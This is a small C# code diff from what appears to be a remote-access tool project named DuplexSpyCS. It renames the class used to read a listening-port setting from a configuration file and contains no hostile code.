@@ -32,7 +32,7 @@ namespace DuplexSpyCS
 
         private void frmListen_Load(object sender, EventArgs e)
         {
-            textBox1.Text = C2.ini_manager.Read("General", "listen_port");
+            textBox1.Text = clsStore.ini_manager.Read("General", "listen_port");
         }
 
         //Stop
